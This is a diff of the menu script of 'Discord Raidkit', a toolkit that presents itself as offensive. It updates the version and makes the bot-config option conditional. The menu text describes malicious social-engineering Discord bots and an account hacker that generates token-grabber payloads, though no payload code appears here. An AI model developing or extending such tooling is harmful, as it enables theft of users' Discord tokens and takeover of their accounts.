@@ -1,8 +1,8 @@
 """
-Discord Raidkit v2.4.3
+Discord Raidkit v2.4.4
 the-cult-of-integral
 
-Last modified: 2023-04-27 22:29
+Last modified: 2023-11-04 21:38
 """
 
 import asyncio.proactor_events as ape
@@ -24,6 +24,10 @@ import utils.io_utils as iou
 import utils.log_utils as lu
 
 nest_asyncio.apply()
+
+
+def check_config_exists():
+    return pathlib.Path(conf.DEF_CONFIG_FILE_PATH).exists()
 
 
 def run_option(option_id: int) -> None:
@@ -75,9 +79,8 @@ def main():
     opts = [
         iou.MenuOption('Anubis', 'A malicious Discord bot with a moderation command suite for social engineering', run_option, 1),
         iou.MenuOption('Qetesh', 'A malicious Discord bot with an NSFW command suite for social engineering', run_option, 2),
-        iou.MenuOption('Osiris', 'A discord account hacker that can also generate token-grabber payloads', run_option, 3)]
-    if pathlib.Path(conf.DEF_CONFIG_FILE_PATH).exists():
-        opts.append(iou.MenuOption('Edit Bot Config', 'Edit the configuration of Anubis/Qetesh', run_option, 4))
+        iou.MenuOption('Osiris', 'A discord account hacker that can also generate token-grabber payloads', run_option, 3),
+        iou.MenuOption('Edit Bot Config', 'Edit the configuration of Anubis/Qetesh', run_option, 4, condition=check_config_exists)]
     menu = iou.NumberedMenu(drui.DISCORD_RAIDKIT_ASCII, opts, False, cama.Fore.LIGHTBLUE_EX, cama.Fore.LIGHTCYAN_EX)
     menu.run()
 
